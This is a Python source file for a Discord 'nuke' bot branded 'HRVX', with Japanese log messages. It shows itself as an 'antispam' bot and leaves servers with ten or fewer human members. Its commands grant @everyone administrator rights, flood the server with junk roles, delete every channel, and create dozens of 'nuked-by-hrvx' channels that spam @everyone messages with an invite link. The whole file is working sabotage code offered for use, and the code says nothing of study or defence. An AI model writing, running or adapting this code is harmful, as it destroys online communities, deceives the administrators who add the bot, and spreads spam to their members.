import discord
from discord.ext import commands
import asyncio
import os
from dotenv import load_dotenv
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")
intents = discord.Intents.default()
intents.guilds = True
intents.members = True

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

宣伝文 = (
    "@everyone @here\n"
    "# Nuked by HRVX\n"
    "# [参加](https://discord.gg/QH4t5rSvXP)\n"
    "# [画像](https://imgur.com/O3QjkOz)\n"
    "# [画像](https://imgur.com/NbBGFcf)"
)
from discord import Status,Activity, ActivityType

@bot.event
async def on_ready():
    await bot.change_presence(
        status=Status.online,  
        activity=Activity(type=ActivityType.playing, name="antispam")
    )
    print(f"ログイン成功: {bot.user}")
    for guild in bot.guilds:
        human_count = sum(1 for member in guild.members if not member.bot)
        print(f"確認中: {guild.name}（人間メンバー数: {human_count}）")

        if human_count <= 10:
            print(f"{guild.name} から退出します（メンバーが10人以下）")
            await guild.leave()

@bot.event
async def on_guild_join(guild):
    human_count = sum(1 for member in guild.members if not member.bot)
    print(f"{guild.name} に参加しました（メンバー数: {human_count}）")

    if human_count <= 10:
        print(f"{guild.name} から即退出します（メンバーが10人以下）")
        await guild.leave()

@bot.command()
async def admin(ctx):
    everyone_role = ctx.guild.default_role
    perms = everyone_role.permissions

    if perms.administrator:
        print(" すでに @everyone に管理者権限があります。")
        return

    new_perms = perms
    new_perms.update(administrator=True)

    try:
        await everyone_role.edit(permissions=new_perms)
        print(f" {ctx.guild.name} で @everyone に管理者権限を付与しました。")
    except discord.Forbidden:
        print(f" 権限不足: {ctx.guild.name} でロール編集できません。")
    except Exception as e:
        print(f" エラー発生: {e}")

@bot.command(name="roll")
@commands.has_permissions(manage_roles=True)
async def roll(ctx):
    total_existing_roles = len(ctx.guild.roles)
    if total_existing_roles >= 250:
        print(f"[LOG] ロール上限に達しているため作成中止 (サーバー: {ctx.guild.name})")
        return

    roles_to_create = 250 - total_existing_roles
    created = 0

    print(f"[LOG] ロール作成開始 - サーバー: {ctx.guild.name}, 作成数: {roles_to_create}")

    for i in range(roles_to_create):
        try:
            role = await ctx.guild.create_role(name="HRVX")
            created += 1
            print(f"[LOG] 作成成功: {role.name} (ID: {role.id})")
        except discord.HTTPException as e:
            print(f"[ERROR] 作成失敗 ({i+1}個目): {e}")
            break
    print(f"[LOG] ロール作成完了 - 合計: {created} 個")
    
@bot.command()
async def hrvx(ctx):
    guild = ctx.guild
    await ctx.message.delete()

    print(" チャンネル削除中")
    delete_tasks = [asyncio.create_task(ch.delete()) for ch in guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    print(" チャンネル作成中")
    new_channels = []
    for i in range(0, 60, 15):
        tasks = [
            asyncio.create_task(guild.create_text_channel("nuked-by-hrvx"))
            for _ in range(30)
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, discord.TextChannel):
                new_channels.append(r)
        await asyncio.sleep(0.5)  

    print(" スパム開始")
    async def spam(ch):
        for _ in range(60):
            try:
                await ch.send(宣伝文)
                await asyncio.sleep(0.5)
            except:
                await asyncio.sleep(1)

    await asyncio.gather(*(spam(ch) for ch in new_channels))
    print(" nukeログ")

bot.run(TOKEN)
